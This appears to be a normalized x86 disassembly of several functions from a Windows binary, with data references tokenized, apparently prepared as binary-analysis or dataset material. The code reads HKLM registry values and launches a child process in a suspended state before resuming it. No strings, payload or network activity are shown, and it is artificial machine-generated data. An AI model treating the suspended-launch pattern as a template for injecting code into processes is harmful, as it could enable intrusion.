mov [ ecx + 0x10 ] ebx
mov [ esp + 0x6c ] esp
mov [ ecx ] ax
push 0xb
mov eax r--data
call sub_401c90
mov ecx esi
mov [ esp + 0x7c ] 0xffffffff
call sub_4208d0
add esp 0x54
cmp al bl
mov eax r--data
jne r-xdata
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_404c10
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax r--data
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov al 0x1
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
sub_41f770
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_453fe0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x20 ]
mov [ fs : 0x0 ] eax
sub esp 0x1c
mov ecx esp
xor eax eax
xor ebx ebx
mov edi 0x7
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] ebx
mov [ esp + 0x2c ] esp
mov [ ecx ] ax
push 0xa
mov eax r--data
xor esi esi
call sub_401c90
sub esp 0x1c
mov [ esp + 0x60 ] ebx
mov ecx esp
mov [ esp + 0x4c ] esp
xor edx edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] ebx
push 0xa
mov eax r--data
mov [ ecx ] dx
call sub_401c90
sub esp 0x1c
mov ecx esp
mov [ esp + 0x7c ] 0x1
xor eax eax
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] ebx
mov [ esp + 0x6c ] esp
mov [ ecx ] ax
push edi
mov eax r--data
call sub_401c90
mov ecx esi
mov [ esp + 0x7c ] 0xffffffff
call sub_4208d0
add esp 0x54
cmp al bl
mov eax r--data
jne r-xdata
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_404c10
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax r--data
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov al 0x1
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
sub_41f8b0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_453fe0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x20 ]
mov [ fs : 0x0 ] eax
sub esp 0x1c
mov ecx esp
xor eax eax
xor ebx ebx
mov edi 0x7
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] ebx
mov [ esp + 0x2c ] esp
mov [ ecx ] ax
push 0xe
mov eax r--data
xor esi esi
call sub_401c90
sub esp 0x1c
mov [ esp + 0x60 ] ebx
mov ecx esp
mov [ esp + 0x4c ] esp
xor edx edx
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] ebx
push 0xe
mov eax r--data
mov [ ecx ] dx
call sub_401c90
sub esp 0x1c
mov ecx esp
mov [ esp + 0x7c ] 0x1
xor eax eax
mov [ ecx + 0x14 ] edi
mov [ ecx + 0x10 ] ebx
mov [ esp + 0x6c ] esp
mov [ ecx ] ax
push 0xb
mov eax r--data
call sub_401c90
mov ecx esi
mov [ esp + 0x7c ] 0xffffffff
call sub_4208d0
add esp 0x54
cmp al bl
mov eax r--data
jne r-xdata
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_404c10
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov eax r--data
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov al 0x1
mov ecx [ esp + 0x20 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
sub_41f9f0
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_453fa8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x50
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x48 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x60 ]
mov [ fs : 0x0 ] eax
mov eax [ r--data ]
mov ecx [ r--data ]
mov dx [ r--data ]
mov [ esp + 0x4c ] eax
mov al [ r--data ]
mov [ esp + 0x50 ] ecx
mov ecx [ r--data ]
mov [ esp + 0x54 ] dx
mov edx [ r--data ]
mov [ esp + 0x56 ] al
mov ax [ r--data ]
mov [ esp + 0x40 ] ecx
mov cl [ r--data ]
mov [ esp + 0x44 ] edx
mov [ esp + 0x48 ] ax
mov eax 0x7
xor ebx ebx
xor edx edx
mov [ esp + 0x4a ] cl
mov [ esp + 0x38 ] eax
mov [ esp + 0x34 ] ebx
mov [ esp + 0x24 ] dx
lea ecx [ esp + 0x24 ]
push ecx
sub esp 0x1c
mov ecx esp
mov [ esp + 0x88 ] ebx
mov [ ecx + 0x14 ] eax
mov [ esp + 0x34 ] esp
mov [ ecx + 0x10 ] ebx
push 0x13
mov eax r--data
mov [ ecx ] dx
call sub_401c90
call sub_41fca0
add esp 0x20
cmp al bl
je r-xdata
push r--data
push rw-data
call sub_409de0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
sub esp 0x1c
mov ecx esp
mov esi 0xf
lea eax [ esp + 0x5c ]
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
mov [ esp + 0x30 ] ebx
mov [ esp + 0x3c ] esp
mov [ ecx ] bl
lea edi [ eax + 0x1 ]
lea esp [ esp ]
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
cmp edi ebx
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax edi
push eax
lea eax [ esp + 0x60 ]
push eax
call sub_405a70
sub esp 0x1c
mov [ esp + 0xa0 ] 0x1
mov ecx esp
lea eax [ esp + 0x84 ]
mov [ ecx + 0x14 ] esi
mov [ ecx + 0x10 ] ebx
mov [ esp + 0x54 ] esp
mov [ ecx ] bl
lea edi [ eax + 0x1 ]
cmp [ esp + 0x38 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] ebx
jne r-xdata
mov edi 0x4
mov dl [ eax ]
inc eax
cmp dl bl
jne r-xdata
sub eax edi
push eax
lea edx [ esp + 0x88 ]
push edx
call sub_405a70
sub esp 0x1c
mov edi esp
mov [ esp + 0xbc ] 0x2
mov [ esp + 0x6c ] esp
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
push ebx
lea ecx [ esp + 0x7c ]
mov [ edi ] ax
push ecx
or eax 0xffffffff
call sub_401be0
lea ecx [ esp + 0x68 ]
mov [ esp + 0xbc ] bl
call sub_420a40
add esp 0x54
mov [ esp + 0x13 ] al
cmp al bl
mov eax r--data
jne r-xdata
mov al 0x1
mov ecx [ esp + 0x60 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x48 ]
xor ecx esp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov edx [ esp + 0x24 ]
push edx
call sub_43811c
add esp 0x4
push ebx
push eax
call sub_402d50
or eax 0x4
push eax
push ecx
push r--data
push rw-data
call sub_409de0
add esp 0xc
push eax
call sub_409de0
add esp 0x8
cmp [ esp + 0x13 ] bl
je r-xdata
mov eax r--data
push ebx
push 0xb
push 0xb
sub esp 0x1c
mov ecx esp
mov [ esp + 0x40 ] esp
xor edx edx
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] ebx
push 0xc
mov eax r--data
lea edi [ esp + 0x6c ]
lea esi [ esp + 0x78 ]
mov [ ecx ] dx
call sub_401c90
mov eax [ esp + 0x3c ]
push eax
mov edx edi
mov ecx esi
call sub_407770
add esp 0x2c
jmp r-xdata
sub_41fca0
push ebp
mov ebp esp
push 0xffffffff
push sub_453128
mov eax [ fs : 0x0 ]
push eax
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x24 ]
mov [ ebp - 0x88 ] eax
xor esi esi
mov [ ebp - 0x4 ] esi
xor ecx ecx
mov [ ebp - 0x48 ] cx
push 0x11
mov eax r--data
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x65 ] 0x0
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] esi
call sub_401c90
push esi
lea edx [ ebp + 0x8 ]
push edx
or eax 0xffffffff
lea edi [ ebp - 0x48 ]
mov [ ebp - 0x4 ] 0x1
call sub_406d90
mov ebx 0x6
push ebx
mov eax r--data
mov ecx edi
call sub_40ac40
cmp [ ebp - 0x34 ] 0x8
mov eax [ ebp - 0x48 ]
jae r-xdata
lea ecx [ ebp - 0x70 ]
push ecx
push 0x20019
push esi
push eax
push 0x80000002
call [ RegOpenKeyExW@IAT ]
cmp eax esi
jne r-xdata
mov eax edi
push eax
lea ecx [ ebp - 0x2c ]
push esi
push ecx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push ecx
lea edx [ ebp - 0x48 ]
push edx
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x8
call sub_404c10
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_404c10
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov ecx [ ebp - 0x70 ]
lea edx [ ebp - 0x74 ]
push edx
push esi
lea eax [ ebp - 0x7c ]
push eax
push esi
push r--data
push ecx
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x74 ] esi
call [ RegQueryValueExW@IAT ]
cmp eax esi
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push eax
lea edx [ ebp - 0x2c ]
push esi
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push ecx
push esi
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x7
call sub_404c10
add esp 0xc
push eax
call sub_420bb0
add esp 0x4
push eax
call sub_404c10
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
cmp [ ebp - 0x7c ] 0x1
jne r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push r--data
push ecx
push esi
push ecx
push r--data
push rw-data
call sub_404c10
add esp 0xc
push eax
call sub_420bb0
add esp 0x4
push eax
call sub_404c10
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov edx [ ebp - 0x74 ]
push edx
call sub_435b34
mov edx [ ebp - 0x70 ]
add esp 0x4
mov edi eax
lea eax [ ebp - 0x74 ]
push eax
push edi
lea ecx [ ebp - 0x7c ]
push ecx
push esi
push r--data
push edx
mov [ ebp - 0x78 ] edi
call [ RegQueryValueExW@IAT ]
cmp eax esi
jne r-xdata
mov esi 0x8
cmp [ ebp - 0x34 ] esi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push eax
lea edx [ ebp - 0x64 ]
push esi
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push ecx
push edi
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] bl
call sub_404c10
add esp 0xc
push eax
call sub_420bb0
add esp 0x4
push eax
call sub_404c10
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
xor eax eax
mov [ ebp - 0x2c ] ax
push 0x17
mov eax r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] esi
call sub_401c90
mov eax edi
mov [ ebp - 0x4 ] 0x2
lea edx [ eax + 0x2 ]
xor ecx ecx
mov [ ebp - 0x34 ] 0x7
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] cx
cmp [ ebp + 0x1c ] esi
jb r-xdata
mov eax [ ebp - 0x48 ]
push eax
call sub_43811c
add esp 0x4
mov eax [ ebp - 0x70 ]
push eax
call [ RegCloseKey@IAT ]
jmp r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov cx [ eax ]
add eax 0x2
cmp cx si
jne r-xdata
sub eax edx
sar eax 0x1
push eax
mov eax edi
lea ecx [ ebp - 0x2c ]
call sub_40ac40
push 0xe
mov eax r--data
lea ecx [ ebp - 0x2c ]
call sub_40ac40
cmp [ ebp - 0x18 ] 0x8
mov eax [ ebp - 0x2c ]
jae r-xdata
mov al [ ebp - 0x65 ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
mov eax [ ebp - 0x70 ]
push eax
call [ RegCloseKey@IAT ]
jmp r-xdata
or eax 0x4
lea esi [ ebp - 0x64 ]
call sub_4218d0
mov edi [ ebp - 0x78 ]
push edi
call sub_438111
mov eax [ ebp - 0x70 ]
add esp 0x4
push eax
call [ RegCloseKey@IAT ]
jmp r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
lea ecx [ ebp - 0x6c ]
push ecx
push 0x20019
push esi
push eax
push 0x80000002
call [ RegOpenKeyExW@IAT ]
cmp eax esi
jne r-xdata
lea eax [ ebp - 0x2c ]
push 0x0
push eax
call sub_402d50
or eax 0x4
push eax
lea ecx [ ebp - 0x64 ]
push esi
push ecx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push ecx
lea edx [ ebp - 0x2c ]
push edx
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x5
call sub_404c10
add esp 0xc
push eax
call sub_40a0a0
add esp 0xc
push eax
call sub_404c10
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] bl
jne r-xdata
mov ecx [ ebp - 0x6c ]
mov ebx [ RegQueryValueExW@IAT ]
lea edx [ ebp - 0x84 ]
push edx
push esi
lea eax [ ebp - 0x80 ]
push eax
push esi
push r--data
push ecx
mov [ ebp - 0x80 ] esi
mov [ ebp - 0x84 ] esi
call ebx
cmp eax esi
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push eax
lea edx [ ebp - 0x64 ]
push esi
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push ecx
push esi
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x4
call sub_404c10
add esp 0xc
push eax
call sub_420bb0
add esp 0x4
push eax
call sub_404c10
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
call sub_408150
lea esi [ ebp - 0x64 ]
call sub_4218d0
mov eax [ ebp - 0x6c ]
push eax
call [ RegCloseKey@IAT ]
lea esi [ ebp - 0x2c ]
call sub_4218d0
push edi
call sub_438111
mov eax [ ebp - 0x70 ]
add esp 0x4
push eax
call [ RegCloseKey@IAT ]
jmp r-xdata
cmp [ ebp - 0x80 ] 0x1
jne r-xdata
lea esi [ ebp - 0x64 ]
call sub_4218d0
mov edi [ ebp - 0x78 ]
lea esi [ ebp - 0x2c ]
call sub_4218d0
push edi
call sub_438111
mov eax [ ebp - 0x70 ]
add esp 0x4
push eax
call [ RegCloseKey@IAT ]
jmp r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push r--data
push ecx
push esi
push ecx
push r--data
push rw-data
call sub_404c10
add esp 0xc
push eax
call sub_420bb0
add esp 0x4
push eax
call sub_404c10
add esp 0x8
mov esi eax
call sub_408150
mov eax [ ebp - 0x6c ]
push eax
call [ RegCloseKey@IAT ]
lea esi [ ebp - 0x2c ]
call sub_4218d0
push edi
call sub_438111
mov eax [ ebp - 0x70 ]
add esp 0x4
push eax
call [ RegCloseKey@IAT ]
jmp r-xdata
mov edx [ ebp - 0x84 ]
push edx
call sub_435b34
mov edx [ ebp - 0x6c ]
add esp 0x4
mov edi eax
lea eax [ ebp - 0x84 ]
push eax
push edi
lea ecx [ ebp - 0x80 ]
push ecx
push esi
push r--data
push edx
call ebx
cmp eax esi
sete cl
mov [ ebp - 0x65 ] cl
test cl cl
je r-xdata
push 0x0
push eax
call sub_402d50
or eax 0x4
push eax
lea ecx [ ebp - 0x64 ]
push esi
push ecx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push ecx
push edi
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x3
call sub_404c10
add esp 0xc
push eax
call sub_420bb0
add esp 0x4
push eax
call sub_404c10
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
call sub_408150
lea esi [ ebp - 0x64 ]
call sub_4218d0
push edi
call sub_438111
mov eax [ ebp - 0x6c ]
mov edi [ ebp - 0x78 ]
add esp 0x4
push eax
call [ RegCloseKey@IAT ]
lea esi [ ebp - 0x2c ]
call sub_4218d0
push edi
call sub_438111
mov eax [ ebp - 0x70 ]
add esp 0x4
push eax
call [ RegCloseKey@IAT ]
jmp r-xdata
mov eax [ ebp - 0x88 ]
push eax
mov eax edi
call sub_4019c0
push edi
call sub_438111
mov eax [ ebp - 0x6c ]
mov edi [ ebp - 0x78 ]
add esp 0x4
push eax
call [ RegCloseKey@IAT ]
lea esi [ ebp - 0x2c ]
call sub_4218d0
push edi
call sub_438111
mov eax [ ebp - 0x70 ]
add esp 0x4
push eax
call [ RegCloseKey@IAT ]
jmp r-xdata
sub_420420
push ebp
mov ebp esp
push 0xffffffff
push sub_4530b0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x88
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x28 ]
mov [ ebp - 0x3c ] eax
mov [ ebp - 0x40 ] ecx
mov [ ebp - 0x44 ] edx
xor ebx ebx
push 0x10
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x2d ] bl
call sub_438178
add esp 0x4
cmp eax ebx
je r-xdata
mov [ ebp - 0x34 ] ebx
mov esi ebx
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov esi eax
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ ebp - 0x34 ] esi
jmp r-xdata
mov eax [ ebp + 0x18 ]
push eax
push ecx
push eax
push edi
call sub_438efb
mov ecx [ ebp + 0x18 ]
add esp 0x10
push esi
lea edx [ ebp - 0x90 ]
push edx
push ebx
push ebx
push 0x14
push ebx
push ebx
push ebx
push edi
xor eax eax
push ebx
mov [ edi + ecx * 2 ] ax
call [ CreateProcessW@IAT ]
test eax eax
push edi
setne bl
call sub_438111
add esp 0x4
test bl bl
je r-xdata
lea ecx [ ebp + 0x8 ]
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] eax
push 0x44
mov [ esi + 0xc ] eax
lea eax [ ebp - 0x90 ]
push ebx
push eax
call sub_43a820
mov eax [ ebp + 0x18 ]
xor ecx ecx
inc eax
add esp 0xc
mov edx 0x2
mul edx
seto cl
mov [ ebp - 0x90 ] 0x44
neg ecx
or ecx eax
push ecx
call sub_435b34
mov ecx [ ebp + 0x8 ]
add esp 0x4
cmp [ ebp + 0x1c ] 0x8
mov edi eax
jae r-xdata
push 0x0
lea edx [ ebp - 0x2c ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x5
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push 0x1d8
call sub_438178
mov edi eax
add esp 0x4
test edi edi
je r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
push 0x1d8
push 0x0
push edi
call sub_43a820
add esp 0xc
mov ebx edi
jmp r-xdata
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
lea eax [ ebp - 0x2c ]
push 0x1
push eax
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x3
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov eax [ esi ]
mov edx [ ebp - 0x3c ]
mov edi [ ebp + 0x24 ]
push eax
mov eax [ ebx + 0x8 ]
lea ecx [ ebp - 0x38 ]
push ecx
push edx
push 0x0
push eax
mov [ ebp - 0x38 ] 0x0
call sub_406610
add esp 0x14
test al al
je r-xdata
mov edi [ esi ]
push ebx
call sub_40b930
add esp 0x4
test al al
je r-xdata
mov ebx [ ebp - 0x34 ]
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
push 0x0
lea edx [ ebp - 0x2c ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x2
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
jmp r-xdata
mov ecx [ ebp - 0x40 ]
mov eax [ esi ]
mov esi edi
mov edi [ ebp - 0x38 ]
push ecx
call sub_406560
add esp 0x4
mov [ ebp - 0x2d ] al
test al al
jne r-xdata
mov al [ ebp - 0x2d ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
push eax
call sub_43811c
add esp 0x4
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x18 ] 0x8
jb r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
push ebx
call sub_43811c
mov ebx [ ebp - 0x34 ]
mov eax [ ebx + 0x4 ]
add esp 0x4
push eax
call [ ResumeThread@IAT ]
cmp eax 0xffffffff
jne r-xdata
push 0x0
lea edx [ ebp - 0x2c ]
push 0x1
push edx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x1
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_43811c
add esp 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
mov eax [ ebp - 0x44 ]
test eax eax
je r-xdata
push 0x0
lea ecx [ ebp - 0x2c ]
push 0x1
push ecx
call sub_40e020
add esp 0xc
push eax
push ecx
push r--data
push rw-data
mov [ ebp - 0x4 ] 0x4
call sub_409de0
add esp 0xc
push eax
call sub_40a0a0
add esp 0x8
mov esi eax
push 0xa
mov ecx esi
call sub_408340
mov edx [ esi ]
mov eax [ edx + 0x4 ]
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov edx [ ebx ]
push 0xffffffff
push edx
call [ WaitForInputIdle@IAT ]
mov eax [ ebx + 0x4 ]
mov esi [ CloseHandle@IAT ]
push eax
call esi
mov ecx [ ebx ]
push ecx
call esi
jmp r-xdata
mov ecx [ ebx + 0x8 ]
mov [ eax ] ecx
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
lea esi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x0
call sub_4218d0
jmp r-xdata
mov eax [ ecx + 0xc ]
or eax edi
